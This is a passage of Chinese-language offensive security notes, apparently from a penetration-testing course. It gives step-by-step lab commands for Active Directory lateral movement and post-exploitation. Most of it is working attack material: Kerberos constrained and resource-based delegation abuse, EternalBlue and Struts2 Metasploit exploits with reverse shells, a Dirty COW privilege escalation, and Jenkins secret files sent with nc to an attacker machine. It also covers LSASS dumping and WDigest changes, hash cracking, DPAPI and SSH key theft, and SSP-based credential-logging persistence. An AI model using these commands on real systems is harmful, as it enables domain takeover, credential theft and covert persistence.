mimikatz kerberos::ptt [0;13da31]-2-0-60a00000-Administrator@krbtgt-GOD.ORG.kirbi
4&#x3001;&#x8FDE;&#x63A5;&#x901A;&#x8BAF;&#x57DF;&#x63A7;
dir \\owa2010cn-god\c$

-&#x7EA6;&#x675F;&#x59D4;&#x6D3E;
&#x539F;&#x7406;&#xFF1A;
&#x7531;&#x4E8E;&#x975E;&#x7EA6;&#x675F;&#x59D4;&#x6D3E;&#x7684;&#x4E0D;&#x5B89;&#x5168;&#x6027;&#xFF0C;&#x5FAE;&#x8F6F;&#x5728;windows server 2003&#x4E2D;&#x5F15;&#x5165;&#x4E86;&#x7EA6;&#x675F;&#x59D4;&#x6D3E;&#xFF0C;&#x5BF9;Kerberos&#x534F;&#x8BAE;&#x8FDB;&#x884C;&#x4E86;&#x62D3;&#x5C55;&#xFF0C;
&#x5F15;&#x5165;&#x4E86;SService for User to Self (S4U2Self)&#x548C; Service for User to Proxy (S4U2proxy)&#x3002;

&#x5229;&#x7528;&#x573A;&#x666F;&#xFF1A;
&#x5982;&#x679C;&#x653B;&#x51FB;&#x8005;&#x63A7;&#x5236;&#x4E86;&#x670D;&#x52A1;A&#x7684;&#x8D26;&#x53F7;&#xFF0C;&#x5E76;&#x4E14;&#x670D;&#x52A1;A&#x914D;&#x7F6E;&#x4E86;&#x5230;&#x57DF;&#x63A7;&#x7684;CIFS&#x670D;&#x52A1;&#x7684;&#x7EA6;&#x675F;&#x6027;&#x59D4;&#x6D3E;&#x3002;
&#x5219;&#x653B;&#x51FB;&#x8005;&#x53EF;&#x4EE5;&#x5148;&#x4F7F;&#x7528;S4u2seflt&#x7533;&#x8BF7;&#x57DF;&#x7BA1;&#x7528;&#x6237;&#xFF08;administrator&#xFF09;&#x8BBF;&#x95EE;A&#x670D;&#x52A1;&#x7684;ST1&#xFF0C;
&#x7136;&#x540E;&#x4F7F;&#x7528;S4u2Proxy&#x4EE5;administrator&#x8EAB;&#x4EFD;&#x8BBF;&#x95EE;&#x57DF;&#x63A7;&#x7684;CIFS&#x670D;&#x52A1;&#xFF0C;&#x5373;&#x76F8;&#x5F53;&#x4E8E;&#x63A7;&#x5236;&#x4E86;&#x57DF;&#x63A7;&#x3002;

&#x590D;&#x73B0;&#x914D;&#x7F6E;&#xFF1A;
1&#x3001;&#x673A;&#x5668;&#x8BBE;&#x7F6E;&#x4EC5;&#x4FE1;&#x4EFB;&#x6B64;&#x8BA1;&#x7B97;&#x673A;&#x6307;&#x5B9A;&#x670D;&#x52A1;-cifs
2&#x3001;&#x7528;&#x6237;&#x8BBE;&#x7F6E;&#x4EC5;&#x4FE1;&#x4EFB;&#x6B64;&#x8BA1;&#x7B97;&#x673A;&#x6307;&#x5B9A;&#x670D;&#x52A1;-cifs

&#x5224;&#x65AD;&#x67E5;&#x8BE2;&#xFF1A;
&#x67E5;&#x8BE2;&#x673A;&#x5668;&#x7528;&#x6237;&#xFF08;&#x4E3B;&#x673A;&#xFF09;&#x914D;&#x7F6E;&#x7EA6;&#x675F;&#x59D4;&#x6D3E;
AdFind -b &quot;DC=god,DC=org&quot; -f &quot;(&amp;(samAccountType=805306369)(msds-allowedtodelegateto=*))&quot; msds-allowedtodelegateto
&#x67E5;&#x8BE2;&#x670D;&#x52A1;&#x8D26;&#x6237;&#xFF08;&#x4E3B;&#x673A;&#xFF09;&#x914D;&#x7F6E;&#x7EA6;&#x675F;&#x59D4;&#x6D3E;
AdFind -b &quot;DC=god,DC=org&quot; -f &quot;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&quot; msds-allowedtodelegateto

&#x5229;&#x7528;&#x6B65;&#x9AA4;&#xFF1A;
1&#x3001;&#x83B7;&#x53D6;&#x7528;&#x6237;&#x7684;&#x7968;&#x636E;
kekeo &quot;tgt::ask /user:batmanfuture /domain:god.org /password::A@2000chusheng /ticket:administrator.kirbi&quot; &quot;exit&quot;
kekeo &quot;tgt::ask /user:webadmin /domain:god.org /NTLM:518b98ad4178a53695dc997aa02d455c /ticket:administrator.kirbi&quot; &quot;exit&quot;
2&#x3001;&#x5229;&#x7528;&#x7528;&#x6237;&#x7968;&#x636E;&#x83B7;&#x53D6;&#x57DF;&#x63A7;&#x7968;&#x636E;
kekeo &quot;tgs::s4u /tgt:TGT_batmanfuture@GOD.ORG_krbtgt~god.org@GOD.ORG.kirbi /user:Administrator@god.org /service:cifs/owa&quot; &quot;exit&quot;
kekeo &quot;tgs::s4u /tgt:TGT_webadmin@GOD.ORG_krbtgt~god.org@GOD.ORG.kirbi /user:Administrator@god.org /service:cifs/owa2010cn-god.god.org&quot; &quot;exit&quot;
3&#x3001;&#x5BFC;&#x5165;&#x7968;&#x636E;&#x5230;&#x5185;&#x5B58;
mimikatz kerberos::ptt TGS_Administrator@god.org@GOD.ORG_cifs~owa2010cn-god.god.org@GOD.ORG.kirbi
4&#x3001;&#x8FDE;&#x63A5;&#x901A;&#x8BAF;&#x57DF;&#x63A7;
shell dir \\owa2010cn-god.god.org\c$

#&#x6A2A;&#x5411;&#x79FB;&#x52A8;-&#x5B9E;&#x6218;&#x9776;&#x673A;-&#x7EA6;&#x675F;&#x59D4;&#x6D3E;&amp;&#x6570;&#x636E;&#x5E93;&#x653B;&#x9632;
&#x4ECE;&#x5916;&#x7F51; Weblogic &#x6253;&#x5230;&#x5185;&#x7F51;&#xFF0C;&#x518D;&#x5230;&#x7EA6;&#x675F;&#x59D4;&#x6D3E;&#x63A5;&#x7BA1;&#x57DF;&#x63A7;
-&#x653B;&#x51FB;Weblogic - CVE-2017-10271

-&#x653B;&#x51FB;&#x57DF;&#x5185;&#x6210;&#x5458;&#x4E3B;&#x673A; - MS17010
1&#x3001;CS&#x6267;&#x884C;&#x8054;&#x52A8;MSF
msf ip xxxx 
spawn msf
3&#x3001;MSF&#x76D1;&#x542C;&#x8054;&#x52A8;&#x914D;&#x7F6E;
use exploit/multi/handler
set payload windows/meterpreter/reverse_http
set lhost 0.0.0.0
set lport xxxx
run
4&#x3001;&#x6DFB;&#x52A0;&#x8DEF;&#x7531;
run autoroute -p //&#x67E5;&#x770B;&#x5F53;&#x524D;&#x8DEF;&#x7531;&#x8868;
run post/multi/manage/autoroute //&#x6DFB;&#x52A0;&#x5F53;&#x524D;&#x8DEF;&#x7531;&#x8868;
5&#x3001;&#x5229;&#x7528;&#x6A21;&#x5757;
use exploit/windows/smb/ms17_010_eternalblue
set payload windows/x64/meterpreter/bind_tcp //&#x6B63;&#x5411;&#x8FDE;&#x63A5;&#x4E0A;&#x7EBF;
set rhost 10.10.20.7 //&#x8BBE;&#x7F6E;&#x8FDE;&#x63A5;&#x76EE;&#x6807;
set rhosts 10.10.20.7 //&#x8BBE;&#x7F6E;&#x626B;&#x63CF;&#x76EE;&#x6807;
run

&#x67E5;&#x627E;&#x57DF;&#x5185;&#x975E;&#x7EA6;&#x675F;&#x59D4;&#x6D3E;&#x7528;&#x6237;&#x548C;&#x8BA1;&#x7B97;&#x673A;&#xFF1A;
AdFind.exe -h 10.10.10.8 -u saul -up admin!@#45 -b &quot;DC=redteam,DC=red&quot; -f &quot;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&quot; cn distinguishedName msds-allowedtodelegateto
&#x4FE1;&#x606F;&#x6536;&#x96C6;&#x52A0;&#x53E3;&#x4EE4;&#x52A0;&#x6F0F;&#x6D1E;&#x63A2;&#x9488;&#xFF1A;
fscan -h 10.10.10.18

-&#x653B;&#x51FB;&#x57DF;&#x5185;&#x6570;&#x636E;&#x5E93;&#x4E3B;&#x673A; - MSSQL+&#x63D0;&#x6743;
Proxifier +  MDUT + &#x63D0;&#x6743;

-&#x653B;&#x51FB;&#x57DF;&#x5185;&#x57DF;&#x63A7;&#x4E3B;&#x673A; - &#x7EA6;&#x675F;&#x59D4;&#x6D3E;
1&#x3001;kekeo&#x8BF7;&#x6C42;&#x83B7;&#x53D6;sqlserver&#x7684;TGT&#xFF1A;kekeo &quot;tgt::ask /user:sqlserver /domain:redteam.red /password:Server12345 /ticket:administrator.kirbi&quot; &quot;exit&quot;
2&#x3001;&#x4F7F;&#x7528;&#x7968;&#x636E;&#x8BF7;&#x6C42;&#x57DF;&#x63A7;&#xFF1A;kekeo &quot;tgs::s4u /tgt:TGT_sqlserver@REDTEAM.RED_krbtgt~redteam.red@REDTEAM.RED.kirbi /user:Administrator@redteam.red /service:cifs/owa.redteam.red&quot; &quot;exit&quot;
3&#x3001;&#x5BFC;&#x5165;&#x5185;&#x5B58;&#xFF1A;mimikatz kerberos::ptt TGS_Administrator@redteam.red@REDTEAM.RED_cifs~owa.redteam.red@REDTEAM.RED.kirbi
4&#x3001;&#x8FDE;&#x63A5;&#x57DF;&#x63A7;&#xFF1A;dir \\OWA\\c$
</code></pre><pre><code>#&#x6A2A;&#x5411;&#x79FB;&#x52A8;-&#x5B9E;&#x6218;&#x9776;&#x673A;-&#x8D44;&#x6E90;&#x7EA6;&#x675F;&#x59D4;&#x6D3E;
&#x57FA;&#x4E8E;&#x8D44;&#x6E90;&#x7684;&#x7EA6;&#x675F;&#x59D4;&#x6D3E;(RBCD)&#x662F;&#x5728;Windows Server 2012&#x4E2D;&#x65B0;&#x52A0;&#x5165;&#x7684;&#x529F;&#x80FD;&#xFF0C;&#x4E0E;&#x4F20;&#x7EDF;&#x7684;&#x7EA6;&#x675F;&#x59D4;&#x6D3E;&#x76F8;&#x6BD4;&#xFF0C;&#x5B83;&#x4E0D;&#x518D;&#x9700;&#x8981;&#x57DF;&#x7BA1;&#x7406;&#x5458;&#x6743;&#x9650;&#x53BB;&#x8BBE;&#x7F6E;&#x76F8;&#x5173;&#x5C5E;&#x6027;&#x3002;RBCD&#x628A;&#x8BBE;&#x7F6E;&#x59D4;&#x6D3E;&#x7684;&#x6743;&#x9650;&#x8D4B;&#x4E88;&#x4E86;&#x673A;&#x5668;&#x81EA;&#x8EAB;&#xFF0C;&#x65E2;&#x673A;&#x5668;&#x81EA;&#x5DF1;&#x53EF;&#x4EE5;&#x51B3;&#x5B9A;&#x8C01;&#x53EF;&#x4EE5;&#x88AB;&#x59D4;&#x6D3E;&#x6765;&#x63A7;&#x5236;&#x6211;&#x3002;&#x4E5F;&#x5C31;&#x662F;&#x8BF4;&#x673A;&#x5668;&#x81EA;&#x8EAB;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x5728;&#x81EA;&#x5DF1;&#x8D26;&#x6237;&#x4E0A;&#x914D;&#x7F6E;msDS-AllowedToActOnBehalfOfOtherIdentity&#x5C5E;&#x6027;&#x6765;&#x8BBE;&#x7F6E;RBCD&#x3002;

-&#x300B;&#x8BA1;&#x7B97;&#x673A;&#x52A0;&#x2F0A;&#x57DF;&#x65F6;&#xFF0C;&#x52A0;&#x2F0A;&#x57DF;&#x7684;&#x57DF;&#x2F64;&#x6237;&#x88AB;&#x63A7;&#x540E;&#x4E5F;&#x5C06;&#x5BFC;&#x81F4;&#x4F7F;&#x7528;&#x5F53;&#x524D;&#x57DF;&#x7528;&#x6237;&#x52A0;&#x5165;&#x7684;&#x8BA1;&#x7B97;&#x673A;&#x53D7;&#x63A7;&#x3002;

&#x6761;&#x4EF6;&#xFF1A;
1&#x3001;&#x57DF;&#x63A7;Windows2012&#x53CA;&#x4EE5;&#x4E0A;
2&#x3001;&#x5B58;&#x5728;&#x57DF;&#x5185;&#x6210;&#x5458;&#x7528;&#x6237;&#x52A0;&#x5165;&#x57DF;&#x64CD;&#x4F5C;

&#x83B7;&#x53D6;&#x53D7;&#x5BB3;&#x76EE;&#x6807;&#xFF1A;&#x6709;&#x54EA;&#x4E9B;&#x57DF;&#x5185;&#x8BA1;&#x7B97;&#x673A;&#x5B58;&#x5728;&#x540C;&#x4E00;&#x7528;&#x6237;&#x52A0;&#x5165;&#x7684;
AdFind.exe -h 192.168.3.33 -b &quot;DC=xiaodi,DC=local&quot; -f &quot;objectClass=computer&quot; mS-DS-CreatorSID
&#x5224;&#x65AD;&#x53D7;&#x5BB3;&#x7528;&#x6237;&#xFF1A;
sid2user.exe \\192.168.3.33 5 21 1695257952 3088263962 2055235443 1104

&#x589E;&#x52A0;&#x673A;&#x5668;&#xFF1A;
https://github.com/Kevin-Robertson/Powermad
Set-ExecutionPolicy Bypass -Scope Process
Import-Module .\Powermad.ps1
New-MachineAccount -MachineAccount serviceA -Password $(ConvertTo-SecureString &quot;123456&quot; -AsPlainText -Force)

&#x83B7;&#x53D6;sid&#xFF1A;
https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1
Import-Module .\PowerView.ps1
Get-NetComputer serviceA -Properties objectsid
S-1-5-21-1695257952-3088263962-2055235443-1107

&#x8BBE;&#x7F6E;&#x4FEE;&#x6539;&#x5C5E;&#x6027;
powershell
Set-ExecutionPolicy Bypass -Scope Process
import-module .\powerview.ps1
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList &quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-1695257952-3088263962-2055235443-1107)&quot;
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer DATA| Set-DomainObject -Set @{&apos;msds-allowedtoactonbehalfofotheridentity&apos;=$SDBytes} -Verbose

&#x9A8C;&#x8BC1;&#x4FEE;&#x6539;&#x662F;&#x5426;&#x6210;&#x529F;&#xFF1A;
Get-DomainComputer DATA -Properties msds-allowedtoactonbehalfofotheridentity
&#x6E05;&#x9664;&#x4FEE;&#x6539;&#x8BBE;&#x7F6E;&#xFF1A;
Set-DomainObject DATA -Clear &apos;msds-allowedtoactonbehalfofotheridentity&apos; -Verbose

&#x8FDE;&#x63A5;&#x76EE;&#x6807;&#x83B7;&#x53D6;&#x7968;&#x636E;&#xFF1A;
python getST.py -dc-ip 192.168.3.33 xiaodi.local/serviceA\$:123456 -spn cifs/data.xiaodi.local -impersonate administrator
&#x5BFC;&#x5165;&#x7968;&#x636E;&#x5230;&#x5185;&#x5B58;&#xFF1A;
mimikatz kerberos::ptc administrator.ccache
&#x8FDE;&#x63A5;&#x5229;&#x7528;&#x7968;&#x636E;&#xFF1A;
dir \\data.xiaodi.local\c$
python psexec.py -k xiaodi.local/administrator@data.xiaodi.local -no-pass
</code></pre><h3 id="linux&#x6A2A;&#x5411;&#x79FB;&#x52A8;">Linux&#x6A2A;&#x5411;&#x79FB;&#x52A8;</h3>
<pre><code>#&#x6A2A;&#x5411;&#x79FB;&#x52A8;-Linux&#x9776;&#x573A;-SSH&#x534F;&#x8BAE;&amp;RSA&#x5BC6;&#x5319;&#x51ED;&#x8BC1;
~/.ssh/config
~/.ssh/known_hosts
~/.bash_history
&#x4E00;&#x822C;&#x60C5;&#x51B5;&#x4E0B;SSH&#x5BC6;&#x94A5;&#x5B58;&#x653E;&#x5728;~/.ssh/&#x76EE;&#x5F55;&#x4E0B;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x6587;&#x4EF6;&#x4E2D;&#x641C;&#x7D22;&#x5DF2;&#x4FDD;&#x5B58;&#x7684;SSH&#x51ED;&#x8BC1;
grep -ir &quot;BEGIN RSA PRIVATE KEY&quot; /*
grep -ir &quot;BEGIN DSA PRIVATE KEY&quot; /*
grep -ir &quot;BEGIN OPENSSH PRIVATE KEY&quot; /*
&#x53C2;&#x8003;&#xFF1A;https://www.runoob.com/w3cnote/set-ssh-login-key.html

#&#x6A2A;&#x5411;&#x79FB;&#x52A8;-Linux&#x9776;&#x573A;-&#x63D0;&#x6743;&amp;SSH&amp;&#x5BC6;&#x5319;&amp;Jenkins&#x7B49;
1&#x3001;Web DMZ&#x6743;&#x9650;&#x83B7;&#x53D6;
&#x4FE1;&#x606F;&#x6536;&#x96C6;&#xFF1A;
nmap 172.16.250.0/24
172.16.250.10 80&#x5F00;&#x653E;
/struts2-showcase
&#x5229;&#x7528;&#x6F0F;&#x6D1E;&#xFF1A;
msfconsole
use exploit/multi/http/struts2_content_type_ognl
set payload linux/x64/meterpreter/reverse_tcp
set rhosts 172.16.250.10
set lport 80
run
&#x6743;&#x9650;&#x63D0;&#x5347;&#xFF1A;
curl https://raw.githubusercontent.com/sqlnetcat/dirtycow-mem/master/dirtycow-mem.c
upload /root/dirtycow-mem.c /tmp
shell
gcc -Wall -o dirtycow-mem dirtycow-mem.c -ldl -lpthread
python3 -c &quot;import pty;pty.spawn(&apos;/bin/bash&apos;)&quot;
./dirtycow-mem
&#x6301;&#x7EED;&#x7A33;&#x5B9A;&#xFF1A;
echo 0 &gt; /proc/sys/vm/dirty_writeback_centisecs
echo 1 &gt; /proc/sys/kernel/panic &amp;&amp; echo 1 &gt; /proc/sys/kernel/panic_on_oops &amp;&amp; echo 1 &gt; /proc/sys/kernel/panic_on_unrecovered_nmi &amp;&amp; echo 1 &gt; /proc/sys/kernel/panic_on_io_nmi &amp;&amp; echo 1 &gt; /proc/sys/kernel/panic_on_warn
&#x6A2A;&#x5411;&#x79FB;&#x52A8;&#xFF1A;
/opt/tomcat/webapps/kittens/WEB-INF/config/opencms.properties
cat ~/.bash_history
cp ~/.ssh/id_rsa /tmp/id_rsa
chmod 777 id_rsa
download  /tmp/id_rsa /root/id_rsa
chmod 0600 id_rsa
ssh -i id_rsa root@172.16.250.30

2&#x3001;Jenkins DMZ&#x6743;&#x9650;&#x83B7;&#x53D6;
&#x4FE1;&#x606F;&#x6536;&#x96C6;&#xFF1A;
getuid
netstat -anpt
172.16.250.30 8080&#x5F00;&#x653E;
&#x5EFA;&#x7ACB;&#x8282;&#x70B9;&#xFF1A;
use auxiliary/server/socks_proxy
vim /etc/proxychains4.conf
172.16.250.30 8080&#x5F00;&#x653E; jenkins&#x670D;&#x52A1;
&#x653B;&#x51FB;Jenkins&#xFF1A;
nc -lvp 1234 &gt; master.key
nc -lvp 1234 &gt; hudson.util.Secret
nc -lvp 1234 &gt; credentials.xml
nc 172.16.250.128 1234 &lt; /home/jenkins/secrets/hudson.util.Secret
nc 172.16.250.128 1234 &lt; /home/jenkins/secrets/master.key
nc 172.16.250.128 1234 &lt; /home/jenkins/credentials.xml
&#x7834;&#x89E3;&#x5BC6;&#x5319;&#xFF1A;
https://github.com/cheetz/jenkins-decrypt
python decrypt.py master.key hudson.util.Secret credentials.xml

3&#x3001;Database DMZ&#x6743;&#x9650;&#x83B7;&#x53D6;
&#x5BC6;&#x7801;&#x6A2A;&#x5411;&#xFF1A;
ssh db_backup@172.16.250.50
)uDvra{4UL^;r?*h
&#x6743;&#x9650;&#x63D0;&#x5347;&#xFF1A;
getuid
sudo su
</code></pre><h3 id="&#x660E;&#x6587;&#x83B7;&#x53D6;">&#x660E;&#x6587;&#x83B7;&#x53D6;</h3>
<pre><code>&#x6CE8;&#x610F;:
1&#x3001;Windows-Mimikatz&#x9002;&#x7528;&#x73AF;&#x5883;&#xFF1A;
&#x5FAE;&#x8F6F;&#x4E3A;&#x4E86;&#x9632;&#x6B62;&#x660E;&#x6587;&#x5BC6;&#x7801;&#x6CC4;&#x9732;&#x53D1;&#x5E03;&#x4E86;&#x8865;&#x4E01;KB2871997&#xFF0C;&#x5173;&#x95ED;&#x4E86;Wdigest&#x529F;&#x80FD;&#x3002;
&#x5F53;&#x7CFB;&#x7EDF;&#x4E3A;win10&#x6216;2012R2&#x4EE5;&#x4E0A;&#x65F6;&#xFF0C;&#x9ED8;&#x8BA4;&#x5728;&#x5185;&#x5B58;&#x7F13;&#x5B58;&#x4E2D;&#x7981;&#x6B62;&#x4FDD;&#x5B58;&#x660E;&#x6587;&#x5BC6;&#x7801;&#xFF0C;
&#x6B64;&#x65F6;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x4FEE;&#x6539;&#x6CE8;&#x518C;&#x8868;&#x7684;&#x65B9;&#x5F0F;&#x6293;&#x53D6;&#x660E;&#x6587;&#xFF0C;&#x4F46;&#x9700;&#x8981;&#x7528;&#x6237;&#x91CD;&#x65B0;&#x767B;&#x5F55;&#x540E;&#x624D;&#x80FD;&#x6210;&#x529F;&#x6293;&#x53D6;&#x3002;
2&#x3001;Linux-mimipenguin&#x9002;&#x7528;&#x73AF;&#x5883;&#xFF1A;
Kali 4.3.0 (rolling) x64 (gdm3)
Ubuntu Desktop 12.04 LTS x64 (Gnome Keyring 3.18.3-0ubuntu2)
Ubuntu Desktop 16.04 LTS x64 (Gnome Keyring 3.18.3-0ubuntu2)
XUbuntu Desktop 16.04 x64 (Gnome Keyring 3.18.3-0ubuntu2)
VSFTPd 3.0.3-8+b1 (Active FTP client connections)
Apache2 2.4.25-3 (Active/Old HTTP BASIC AUTH Sessions) 
openssh-server 1:7.3p1-1 (Active SSH connections - sudo usage)

&#x6240;&#x4EE5;&#x51FA;&#x73B0;&#x4EE5;&#x4E0B;&#xFF1A;
0&#x3001;Windows-&#x5F3A;&#x5F00;
1&#x3001;&#x6B63;&#x9762;&#x521A;&#x5BC6;&#x6587;-Hashcat
2&#x3001;&#x4FA7;&#x9762;&#x627E;&#x601D;&#x8DEF;-RDP&#x4FDD;&#x5B58;&amp;SSH&#x5BC6;&#x5319;

#Linux-&#x5BC6;&#x7801;&#x83B7;&#x53D6;-&#x5185;&#x5B58;&#x8BFB;&#x53D6;&amp;&#x5BC6;&#x6587;&#x7834;&#x89E3;&amp;&#x5B58;&#x50A8;&#x51ED;&#x8BC1;
1&#x3001;&#x5BC6;&#x7801;&#x8BFB;&#x53D6;&#xFF1A;
https://github.com/huntergregal/mimipenguin
chmod 755 ./mimipenguin.sh
./mimipenguin.sh

2&#x3001;&#x5BC6;&#x7801;&#x7834;&#x89E3;&#xFF1A;
cat /etc/shadow
hashcat.exe -a 3 -m 1800 linuxhash.txt pass.txt
&#x52A0;&#x5BC6;&#x5F62;&#x5F0F;&#xFF1A;
linux sha512crypt $6$, SHA512 (Unix)&#x52A0;&#x5BC6;&#x65B9;&#x5F0F;&#xFF1A;
hashcat -m 1800 sha512linux.txt p.txt
linux sha256crypt $5$, SHA256 (Unix)&#x52A0;&#x5BC6;&#x65B9;&#x5F0F;&#xFF1A;
hashcat -m 7400 sha256linux.txt p.txt
linux&#x4E0B;md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5)&#x52A0;&#x5BC6;&#x65B9;&#x5F0F;&#xFF1A;
hashcat -m 500 linuxmd5.txt p.txt
inux&#x4E0B;bcrypt $2*$, Blowfish&#x52A0;&#x5BC6;&#x65B9;&#x5F0F;&#xFF1A;
hashcat -m 3200 linuxmd5.txt p.txt

3&#x3001;&#x5BC6;&#x7801;&#x5B58;&#x50A8;&#xFF1A;SSH&#x5BC6;&#x5319;-&#x4E0A;&#x8282;&#x8BFE;&#x77E5;&#x8BC6;&#x70B9;

#Windows-&#x5BC6;&#x7801;&#x83B7;&#x53D6;-&#x5728;&#x7EBF;&#x79BB;&#x7EBF;&#x8BFB;&#x53D6;&amp;&#x5BC6;&#x6587;&#x7834;&#x89E3;&amp;&#x5B58;&#x50A8;&#x51ED;&#x8BC1;
1&#x3001;&#x5728;&#x7EBF;&#x8BFB;
https://github.com/gentilkiwi/mimikatz
mimikatz.exe &quot;privilege::debug&quot; &quot;log&quot; &quot;sekurlsa::logonpasswords&quot;

2&#x3001;&#x79BB;&#x7EBF;&#x8BFB;
https://learn.microsoft.com/zh-cn/sysinternals/downloads/procdump
&#x5B9E;&#x9A8C;1&#xFF1A;&#x9488;&#x5BF9;&#x9632;&#x62A4;&#x62E6;&#x622A;(Mimikatz&#x88AB;&#x62E6;&#x622A;)
Procdump&#x662F;&#x5FAE;&#x8F6F;&#x5B98;&#x65B9;&#x7684;&#x5DE5;&#x5177;&#xFF0C;&#x53EF;&#x5728;&#x547D;&#x4EE4;&#x884C;&#x5C06;lsass&#x5BFC;&#x51FA;&#x4E14;&#x6740;&#x8F6F;&#x4E0D;&#x4F1A;&#x62E6;&#x622A;
Procdump.exe -accepteula -ma lsass.exe lsass.dmp
mimikatz.exe &quot;sekurlsa::minidump lsass.DMP&quot;
sekurlsa::logonPasswords full
&#x5B9E;&#x9A8C;2&#xFF1A;&#x9488;&#x5BF9;&#x9AD8;&#x7248;&#x672C;&#x4F46;&#x6709;&#x5B58;&#x50A8;(&#x5185;&#x5B58;&#x8FD8;&#x6709;&#x6570;&#x636E;&#x7684;)
Procdump.exe -accepteula -ma lsass.exe lsass.dmp
mimikatz.exe &quot;sekurlsa::minidump lsass.DMP&quot;
sekurlsa::logonPasswords full

3&#x3001;&#x89E3;&#x51B3;&#x9AD8;&#x7248;&#x672C;
&#x4FEE;&#x6539;&#x6CE8;&#x518C;&#x8868;+&#x5F3A;&#x5236;&#x9501;&#x5C4F;+&#x7B49;&#x5F85;&#x7CFB;&#x7EDF;&#x7BA1;&#x7406;&#x5458;&#x91CD;&#x65B0;&#x767B;&#x5F55;+&#x622A;&#x53D6;&#x660E;&#x6587;&#x5BC6;&#x7801;
&#x4FEE;&#x6539;&#x6CE8;&#x518C;&#x8868;&#x6765;&#x8BA9;Wdigest Auth&#x4FDD;&#x5B58;&#x660E;&#x6587;&#x53E3;&#x4EE4;&#x65B9;&#x5F0F;
reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\ /v UseLogonCredential /t REG_DWORD /d 1

4&#x3001;HASH&#x7834;&#x89E3;
https://hashcat.net/
https://www.cmd5.com/
https://www.somd5.com/
hashcat cmd5 somd5
518b98ad4178a53695dc997aa02d455c
https://www.cnblogs.com/Junglezt/p/16044372.html
-m &#x5BC6;&#x6587;&#x7C7B;&#x578B;
-a &#x7834;&#x89E3;&#x7C7B;&#x578B;
?l &#x5C0F;&#x5199;
?s &#x7B26;&#x53F7;
?d &#x6570;&#x5B57;
&#x5B57;&#x5178;&#x7834;&#x89E3;&#xFF1A;
.\hashcat.exe -a 0 -m 1000 .\hash.txt .\pass.txt
&#x66B4;&#x529B;&#x7834;&#x89E3;&#xFF1A;
hashcat.exe -a 3 -m 1000 518b98ad4178a53695dc997aa02d455c ?l?l?l?l?l?s?s?s?d?d

5&#x3001;RDP&#x51ED;&#x636E;&#x6293;&#x53D6;   
&#x67E5;&#x770B;&#x8FDE;&#x63A5;&#x8BB0;&#x5F55;&#xFF1A;
cmdkey /list
&#x67E5;&#x627E;&#x672C;&#x5730;&#x7684;Credentials&#xFF1A;
dir /a %userprofile%\appdata\local\microsoft\credentials\*
Credentials&#x8BB0;&#x5F55;guidMasterKey&#x503C;:
mimikatz dpapi::cred /in:C:\Users\webadmin\appdata\local\microsoft\credentials\5FBB2585F99BA05366F08E52F1C1740B
&#x627E;&#x5230;guidMasterKey&#x5BF9;&#x5E94;&#x7684;MasterKey:
mimikatz sekurlsa::dpapi
&#x89E3;&#x5BC6;&#x6307;&#x5B9A;&#x7684;MasterKey&#x51ED;&#x636E;&#xFF1A;
mimikatz dpapi::cred /in:C:\Users\webadmin\appdata\local\microsoft\credentials\5FBB2585F99BA05366F08E52F1C1740B /masterkey:f70e1a641096f1b63731d571b43b33aaf009f6af5a3352504e6ddb3cd158f17eec2d541f18b8289ebf547d871dfb257a6bbbd5232550eb6f26a06d39378da4a5
</code></pre><h3 id="&#x6743;&#x9650;&#x7EF4;&#x6301;">&#x6743;&#x9650;&#x7EF4;&#x6301;</h3>
<h4 id="&#x57DF;&#x63A7;&#x6743;&#x9650;&#x7EF4;&#x6301;">&#x57DF;&#x63A7;&#x6743;&#x9650;&#x7EF4;&#x6301;</h4>
<h6 id="ssp">SSP</h6>
<h6 id="hook">HOOK</h6>
<h6 id="skeleton-key">Skeleton Key</h6>
<h6 id="dsrm">DSRM</h6>
<pre><code>&#x53C2;&#x8003;&#x8D44;&#x6599;&#xFF1A;
https://www.cnblogs.com/lcxblogs/p/14216525.html

#&#x5185;&#x7F51;&#x57DF;-&#x6743;&#x9650;&#x7EF4;&#x6301;-&#x57FA;&#x4E8E;&#x9A8C;&#x8BC1;DLL&#x52A0;&#x8F7D;-SSP
&#x65B9;&#x6CD5;&#x4E00;&#xFF1A;&#x4F46;&#x5982;&#x679C;&#x57DF;&#x63A7;&#x5236;&#x5668;&#x91CD;&#x542F;&#xFF0C;&#x88AB;&#x6CE8;&#x5165;&#x5185;&#x5B58;&#x7684;&#x4F2A;&#x9020;&#x7684;SSP&#x5C06;&#x4F1A;&#x4E22;&#x5931;&#x3002;
privilege::debug
misc::memssp
C:\Windows\System32\mimilsa.log &#x8BB0;&#x5F55;&#x767B;&#x5F55;&#x7684;&#x8D26;&#x53F7;&#x5BC6;&#x7801;
&#x65B9;&#x6CD5;&#x4E8C;&#xFF1A;&#x4F7F;&#x7528;&#x6B64;&#x65B9;&#x6CD5;&#x5373;&#x4F7F;&#x7CFB;&#x7EDF;&#x91CD;&#x542F;&#xFF0C;&#x4E5F;&#x4E0D;&#x4F1A;&#x5F71;&#x54CD;&#x5230;&#x6301;&#x4E45;&#x5316;&#x7684;&#x6548;&#x679C;&#x3002;
1&#x3001;mimilib.dll &#x4F20;&#x5230;&#x76EE;&#x6807;&#x57DF;&#x63A7;&#x7684;c:\windows\system32\&#x76EE;&#x5F55;&#x4E0B;
2&#x3001;&#x4FEE;&#x6539;&#x6CE8;&#x518C;&#x8868;&#xFF0C;&#x91CD;&#x542F;&#x751F;&#x6548;
reg query hklm\system\currentcontrolset\control\lsa\ /v &quot;Security Packages&quot;
reg add &quot;HKLM\System\CurrentControlSet\Control\Lsa&quot; /v &quot;Security Packages&quot; /d &quot;kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u\0mimilib&quot; /t REG_MULTI_SZ
c:\windows\system32\kiwissp.log &#x8BB0;&#x5F55;&#x8D26;&#x53F7;&#x5BC6;&#x7801;&#x6587;&#x4EF6;
